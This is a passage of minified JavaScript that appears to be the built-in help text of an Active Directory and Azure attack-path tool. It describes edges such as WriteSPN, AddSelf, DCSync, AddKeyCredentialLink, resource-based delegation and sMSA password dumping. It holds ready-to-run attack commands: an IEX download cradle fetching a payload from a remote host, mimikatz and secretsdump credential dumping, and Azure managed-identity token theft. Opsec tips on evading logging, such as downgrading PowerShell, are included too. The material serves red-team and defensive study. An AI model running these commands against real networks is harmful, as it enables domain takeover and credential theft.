running a process as a member`,". To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then use the New-PSSession command with the credential we just created:"}),h(A,{component:"pre",children:`$session = New-PSSession -ComputerName ${r} -Credential $Cred`}),p(A,{variant:"body2",children:["This will open a powershell session on ",r,"."]}),h(A,{variant:"body2",children:"You can then run a command on the system using the Invoke-Command cmdlet and the session you just created"}),h(A,{component:"pre",children:"Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}"}),h(A,{variant:"body2",children:"Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands."}),h(A,{component:"pre",children:"Disconnect-PSSession -Session $session\nRemove-PSSession -Session $session"}),h(A,{variant:"body2",children:"An example of running through this cobalt strike for lateral movement is as follows:"}),h(A,{component:"pre",children:"powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI."}),h(A,{variant:"body2",children:"Entering a PSSession will generate a logon event on the target computer."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7",children:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7",children:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7"})]})},AZAddMembers:Zt,AZAddSecret:Yt,AZAvereContributor:Qt,AZContains:tr,AZContributor:rr,AZExecuteCommand:nr,AZGetCertificates:or,AZGetKeys:ar,AZGetSecrets:ir,AZHasRole:cr,AZManagedIdentity:Tr,AZMemberOf:Pr,AZOwns:Rr,AZPrivilegedAuthAdmin:Or,AZPrivilegedRoleAdmin:Mr,AZResetPassword:Ir,AZUserAccessAdministrator:Gr,AZGlobalAdmin:sr,AZAppAdmin:Jt,AZCloudAppAdmin:er,AZRunsAs:xr,AZVMAdminLogin:jr,AZVMContributor:{general:()=>h(A,{variant:"body2",children:"The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM"}),h(A,{variant:"body2",children:"Via PowerZure:"}),h(S,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),opsec:()=>h(A,{variant:"body2",children:"Because you'll be running a command as the SYSTEM user on the Virtual Machine, the same opsec considerations for running malicious commands on any system should be taken into account: command line logging, PowerShell script block logging, EDR, etc."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/running-powershell-scripts-on-azure-vms/",children:"https://blog.netspi.com/running-powershell-scripts-on-azure-vms/"})})},WriteSPN:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(A,{variant:"body2",children:[kr(t,e),' the ability to write to the "serviceprincipalname" attribute to the ',Cr(n)," ",r,"."]}),windowsAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t||"Computer"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as"," ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),h(A,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),h(A,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]}),linuxAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[p(A,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),h(A,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),h(A,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),h(A,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),h(A,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.harmj0y.net/redteaming/kerberoasting-revisited/",children:"https://www.harmj0y.net/redteaming/kerberoasting-revisited/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"})]})},AddSelf:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the ability to add"," ","Group"===t?"themselves":"itself",", to the group ",r,". Because of security group delegation, the members of a security group have the same privileges as that group."]}),p(A,{variant:"body2",children:["By adding itself to the group, ",e," will gain the same privileges that ",r," already has."]})]}),windowsAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console."," "]}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as"," ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]}),linuxAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),h(A,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),h(A,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl#bloodhound-edges",children:"https://www.thehacker.recipes/ad/movement/dacl#bloodhound-edges"})]})},AddKeyCredentialLink:{general:({sourceName:e,sourceType:t,targetName:r})=>p(A,{variant:"body2",children:[kr(t,e),' the ability to write to the "msds-KeyCredentialLink" property on ',r,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.']}),windowsAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"To abuse this privilege, use Whisker. "}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t||"Computer"===t?`${e} if you are not running a process as that user/computer`:`a member of ${e} if you are not running a process as a member`]}),h(A,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),h(A,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."})]}),linuxAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"Executing the attack will generate a 5136 (A directory object was modified) event at the domain controller if an appropriate SACL is in place on the target object."}),h(A,{variant:"body2",children:"If PKINIT is not common in the environment, a 4768 (Kerberos authentication ticket (TGT) was requested) ticket can also expose the attacker."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"})]})},DCSync:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain ",r,"."]}),h(A,{variant:"body2",children:"These two privileges allow a principal to perform a DCSync attack."})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),h(A,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),h(A,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),opsec:()=>h(A,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]})},SyncLAPSPassword:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the ability to synchronize the password set by Local Administrator Password Solution (LAPS) on the computer ",r,"."]}),p(A,{variant:"body2",children:["The local administrator password for a computer managed by LAPS is stored in the confidential and Read-Only Domain Controller (RODC) filtered LDAP attribute"," ",h(A,{component:"pre",children:"ms-mcs-AdmPwd"}),"."]})]}),abuse:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:["To abuse this privilege with DirSync, first import DirSync into your agent session or into a PowerShell instance at the console. You must authenticate to the Domain Controller as"," ",kr(t,e),". Then, execute the"," ",h(A,{component:"pre",children:"Sync-LAPS"})," function:"]}),p(A,{component:"pre",children:['Sync-LAPS -LDAPFilter "(samaccountname=',r,')"']}),p(A,{variant:"body2",children:["You can target a specific domain controller using the ",h(A,{component:"pre",children:"-Server"})," ","parameter."]})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"Executing the attack will generate a 4662 (An operation was performed on an object) event at the domain controller if an appropriate SACL is in place on the target object."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/simondotsh/DirSync",children:"https://github.com/simondotsh/DirSync"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://simondotsh.com/infosec/2022/07/11/dirsync.html",children:"https://simondotsh.com/infosec/2022/07/11/dirsync.html"})]})},WriteAccountRestrictions:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," has write rights on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer ",r,", among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting. The other attributes in this set are listed in Dirk-jan's blog on this topic (see references)."]}),h(A,{variant:"body2",children:"The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object."}),h(A,{variant:"body2",children:'If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),h(A,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"\"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)\""}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"'$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:"'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\\n' + '$SDBytes = New-Object byte[] ($SD.BinaryLength)\\n' + '$SD.GetBinaryForm($SDBytes, 0)'"}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"\"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\""}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"'Rubeus.exe hash /password:Summer2018!'"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'"})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),opsec:()=>h(A,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/",children:"https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/"}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl",children:"https://www.thehacker.recipes/ad/movement/dacl"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"})]})},DumpSMSAPassword:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the Standalone Managed Service Account (sMSA) ",r," ","installed on it."]}),p(A,{variant:"body2",children:["With administrative privileges on ",e,", it is possible to dump ",r,"'s password stored in LSA secrets."]})]}),abuse:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:["From an elevated command prompt on ",e,", run mimikatz then execute the following commands:"]}),h(A,{component:"pre",children:"privilege::debug\ntoken::elevate\nlsadump::secrets"}),p(A,{variant:"body2",children:["In the output, find"," ",p(A,{component:"pre",children:["_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_",r?.toLowerCase().split("@")[0]]}),". The next line contains ",h(A,{component:"pre",children:"cur/hex :"})," followed with ",r,"'s password hex-encoded."]}),h(A,{variant:"body2",children:"To use this password, its NT hash must be calculated. This can be done using a small python script:"}),h(A,{component:"pre",children:"# nt.py\nimport sys, hashlib\n\npw_hex = sys.argv[1]\nnt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()\n\nprint(nt_hash)"}),h(A,{variant:"body2",children:"Execute it like so:"}),h(A,{component:"pre",children:"python3 nt.py 35f3e1713d61..."}),h(A,{variant:"body2",children:"To authenticate as the sMSA, leverage pass-the-hash."}),p(A,{variant:"body2",children:["Alternatively, to avoid executing mimikatz on ",e,", you can save a copy of the"," ",h(A,{component:"pre",children:"SYSTEM"})," and"," ",h(A,{component:"pre",children:"SECURITY"})," registry hives from an elevated prompt:"]}),h(A,{component:"pre",children:"reg save HKLM\\SYSTEM %temp%\\SYSTEM & reg save HKLM\\SECURITY %temp%\\SECURITY"}),p(A,{variant:"body2",children:["Transfer the files named ",h(A,{component:"pre",children:"SYSTEM"})," and"," ",h(A,{component:"pre",children:"SECURITY"})," that were saved at"," ",h(A,{component:"pre",children:"%temp%"})," to another computer where mimikatz can be safely executed. On this other computer, run mimikatz from a command prompt then execute the following command to obtain the hex-encoded password:"]}),h(A,{component:"pre",children:"lsadump::secrets /system:C:\\path\\to\\file\\SYSTEM /security:C:\\path\\to\\file\\SECURITY"})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"Access to registry hives can be monitored and alerted via event ID 4656 (A handle to an object was requested)."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html",children:"https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets",children:"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"})]})},AZMGAddMember:hr,AZMGAddOwner:pr,AZMGAddSecret:ur,AZMGGrantAppRoles:gr,AZMGGrantRole:wr,AZMGAppRoleAssignment_ReadWrite_All:mr,AZMGApplication_ReadWrite_All:br,AZMGDirectory_ReadWrite_All:yr,AZMGGroupMember_ReadWrite_All:fr,AZMGGroup_ReadWrite_All:vr,AZMGRoleManagement_ReadWrite_Directory:Ar,AZMGServicePrincipalEndpoint_ReadWrite_All:Sr,AZWebsiteContributor:{general:()=>h(A,{variant:"body2",children:"The Website Contributor role grants full control of the target Function App or Web App. Full control of either of those types of resources allows for arbitrary command execution against the target resoruce."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can use BARK's Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App. You can use BARK's New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App."}),h(A,{variant:"body2",children:"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the web app or function app. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),h(A,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:'Now you can use BARK\'s Invoke-AzureRMWebAppShellCommand function to execute a command against the target Web App. For example, to run a simple "whoami" command:'}),h(A,{component:"pre",children:'Invoke-AzureRMWebAppShellCommand `\n    -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n    -Token $ARMToken `\n    -Command "whoami"'}),h(A,{variant:"body2",children:"If the Web App has a managed identity assignments, you can use BARK's Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the managed identity Service Principal like this:"}),h(A,{component:"pre",children:'PS C:> $PowerShellCommand = \n            $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}\n            $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers\n            $response.RawContent\n\nPS C:> $base64Cmd = [System.Convert]::ToBase64String(\n            [System.Text.Encoding]::Unicode.GetBytes(\n                $PowerShellCommand\n            )\n        )\n\nPS C:> $Command = "powershell -enc $($base64Cmd)"\n\nPS C:> Invoke-AzureRMWebAppShellCommand `\n            -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n            -token $ARMToken `\n            -Command $Command'}),h(A,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/lateral-movement-azure-app-services/",children:"Karl Fosaaen - Lateral Movement in Azure App 